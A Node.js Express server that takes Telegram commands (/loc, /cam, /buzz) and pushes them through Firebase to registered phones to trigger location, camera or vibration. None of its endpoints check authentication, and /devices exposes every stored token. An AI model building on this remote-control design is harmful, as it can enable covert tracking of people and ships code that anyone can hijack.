const express = require("express");
const bodyParser = require("body-parser");
const admin = require("firebase-admin");

const app = express();
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// Devices storage
let devices = {};

// Firebase setup (ENV based)
admin.initializeApp({
  credential: admin.credential.cert({
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, "\n")
  })
});

// Register device
app.post("/register", (req, res) => {
  const { deviceId, token } = req.body;
  devices[deviceId] = token;
  res.send("OK");
});

// Telegram webhook
app.post("/webhook", (req, res) => {
  const text = req.body.message.text;
  const [cmd, deviceId] = text.split(" ");

  if (cmd === "/loc") sendCommand(deviceId, "location");
  if (cmd === "/cam") sendCommand(deviceId, "camera");
  if (cmd === "/buzz") sendCommand(deviceId, "vibrate");

  res.sendStatus(200);
});

// Send command via Firebase
function sendCommand(deviceId, command) {
  const token = devices[deviceId];
  if (!token) return;

  admin.messaging().send({
    token,
    data: { command }
  });
}

// Dashboard data
app.get("/devices", (req, res) => {
  res.json(devices);
});

app.listen(PORT, () => {
  console.log("Running on", PORT);
});
